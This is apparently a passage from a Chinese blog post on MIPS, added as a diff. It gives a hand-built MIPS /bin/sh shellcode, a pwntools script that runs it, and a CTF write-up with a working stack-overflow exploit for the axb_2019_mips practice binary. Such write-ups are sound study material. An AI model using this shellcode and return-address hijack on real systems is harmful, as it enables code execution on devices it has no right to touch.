+<p>多一个 ‘&#x2F;‘ 用作填充。</p>
+<p>同样的，把它们依次放到栈上。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sw $t7, -12($sp)</span><br><span class="line">sw $t6, -8($sp)</span><br><span class="line">sw $zero, -4($sp)  # 空字节</span><br><span class="line">addiu $a0, $sp, - 12  # 使指针指向 a0</span><br></pre></td></tr></table></figure>
+
+<p>2.将 a1 和 a2 归零</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slti $a1, $zero, -1</span><br><span class="line">slti $a2, $zero, -1</span><br></pre></td></tr></table></figure>
+
+<p>3.传递系统调用号，进行系统调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">li $v0, 4011</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>按照正常的流程，到这里就该结束了，但是这里 syscall 的默认机器码为 \x00\x00\x00\x0c，出现了空字节。为了避免传输不可见字符，最后的 syscall 要改成 syscall  + （0x40404 ~ 0x40407） 的一个数（这样 \x0c 之前正好没有空字节)，这点在 pwntools 生成的 shellcode 中也出现了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, bits=<span class="number">32</span>, endian=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  lui $t7, 0x2f2f</span></span><br><span class="line"><span class="string">  ori $t7, $t7,0x6269</span></span><br><span class="line"><span class="string">  lui $t6, 0x6e2f</span></span><br><span class="line"><span class="string">  ori $t6, $t6, 0x7368</span></span><br><span class="line"><span class="string">  sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">  sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">  sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">  addiu $a0, $sp, -12</span></span><br><span class="line"><span class="string">  slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">  slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">  li $v0, 4011</span></span><br><span class="line"><span class="string">  syscall 0x40407</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([ <span class="string">&#x27;\\x%02x&#x27;</span> % x <span class="keyword">for</span> x <span class="keyword">in</span> shellcode ]))</span><br><span class="line"></span><br><span class="line">filename = make_elf(shellcode, extract=<span class="literal">False</span>)</span><br><span class="line">p = process(filename)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>可以 getshell。而且 syscall 后面只要跟的是范围内的数字，编译得到的机器码都是 \x01\x01\x01\xcc ，这是为什么？暂时不想探究了。</p>
+<p>可以 getshell ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">teriteri@ubuntu:~/Desktop/MIPS$ python shellcode32.py</span><br><span class="line">\x3c\x0f\x2f\x2f\x35\xef\x62\x69\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xaf\xff\xf4\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x0f\xab\x01\x01\x01\xcc</span><br><span class="line">[+] Starting local process &#x27;/tmp/pwn-asm-y951nqnl/step3-elf&#x27;: pid 3587</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">mipsel-linux-uclibc  shellcode32.py</span><br></pre></td></tr></table></figure>
+
+<h2 id="qemu-调试方法"><a href="#qemu-调试方法" class="headerlink" title="qemu 调试方法"></a>qemu 调试方法</h2><p>在用户模式下，有几种可行的方法可以实现调试，但都没法同时利用 pwntools，而且非常卡。</p>
+<p>如果通过系统模式直接使用 qemu 虚拟机，则需要虚拟机配置及文件上传的问题，非常麻烦。</p>
+<p>这块等校赛之后再做补充了。</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h4 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h4><p>经典什么保护也没开的 32 位小端。</p>
+<p>main 函数里没什么，主要的东西在 vuln 里：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">32</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, v1, <span class="number">0x200</span>u);                   <span class="comment">// 一个量很大的溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>mips 是没有 bp 指针的，所以值得注意的是调用函数的返回地址是如何存储的，是否会被压入栈，要怎么控制？</p>
+<p>看一下汇编，首先是 main 函数：</p>
+<img src="/2023/12/08/MIPS-%E5%AD%A6%E4%B9%A0/Snipaste_2023-11-21_19-19-45.png" class="">
+
+<p>在 jal  vuln （以及一些函数调用）之前，lw  $gp，xxx 指令出现地很频繁。</p>
+<p>$gp 是一个全局指针（是访问全局变量的关键）， $fp 为帧指针，lw 指令从当前栈帧（使用帧指针 $fp）的局部变量中加载一个值，然后加上一个常数偏移量，并将结果存储到全局指针 $gp 中。确保函数能够正确地访问全局数据。</p>
+<p>紧接着 jal 指令，跳转到 vuln 地址处执行 vuln。同时将下一条指令的地址存储在 $ra 寄存器中。</p>
+<p>看看 vuln：</p>
+<img src="/2023/12/08/MIPS-%E5%AD%A6%E4%B9%A0/Snipaste_2023-11-21_20-10-35.png" class="">
+
+<p>这条指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addiu   $v0, $fp, 0x38+var_20</span><br></pre></td></tr></table></figure>
+
+<p>0x38 + var_20 是不可更改的，但是 $fp 的值可以通过第一次 read 栈溢出进行覆盖（类似于覆盖 ebp）。</p>
+<p>直接把 $fp 位置处的值修改为想要注入 shellcode 的地址 + offset 即可。这里不知道栈地址，所以选择在 bss 段写 shellcode。</p>
+<p>返回地址就覆盖为 read 函数开始的地址，即 addiu 之前的 0x4007E0。</p>
+<p>第二次 read 覆盖返回地址为 shellcode 地址，劫持程序执行 shellcode。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process([&quot;qemu-mipsel&quot;,&quot;-g&quot;, &quot;1234&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p  = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25083</span>)</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;pwn2&quot;</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x410B78</span></span><br><span class="line">read_addr = <span class="number">0x4007E0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;genia&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;genia&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(bss-<span class="number">0x38</span>+<span class="number">0x20</span>) + p32(read_addr)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload2 += p32(bss + <span class="number">0x28</span>)</span><br><span class="line">payload2 += shellcode</span><br><span class="line">p.send(payload2)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#语言" >
+    <span class="tag-code">语言</span>
+  </a>
+
+  <a href="/tags#CTF" >
+    <span class="tag-code">CTF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2023/12/08/linux-%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C/">
+        <span class="nav-arrow">← </span>
+        
+          linux 基础实验
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2023/12/08/%E5%9B%BA%E4%BB%B6%E5%9F%BA%E7%A1%80/">
+        
+          固件基础
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Utterances START -->
+      <div id="utterances"></div>
+      <script src="https://utteranc.es/client.js"
+        repo=""
+        issue-term="pathname"
+        theme="github-light"
+        crossorigin="anonymous"
+        async></script>    
+      <!-- Utterances END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#MIPS-%E5%AD%A6%E4%B9%A0"><span class="toc-nav-text">MIPS 学习</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#MIPS-%E6%B1%87%E7%BC%96"><span class="toc-nav-text">MIPS 汇编</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-nav-text">寄存器</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#32-%E4%B8%AA%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-nav-text">32 个通用寄存器</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%B8%A4%E4%B8%AA%E6%95%B4%E6%95%B0%E4%B9%98%E6%B3%95%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-nav-text">两个整数乘法寄存器</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#32-%E4%B8%AA%E6%B5%AE%E7%82%B9%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-nav-text">32 个浮点寄存器</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="toc-nav-text">常用指令</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#syscall"><span class="toc-nav-text">syscall</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#shellcode-%E7%BC%96%E5%86%99"><span class="toc-nav-text">shellcode 编写</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#qemu-%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-nav-text">qemu 调试方法</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-nav-text">例题</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#axb-2019-mips"><span class="toc-nav-text">axb_2019_mips</span></a></li></ol></li></ol></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2023/12/08/MIPS-学习/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2023 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+    
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
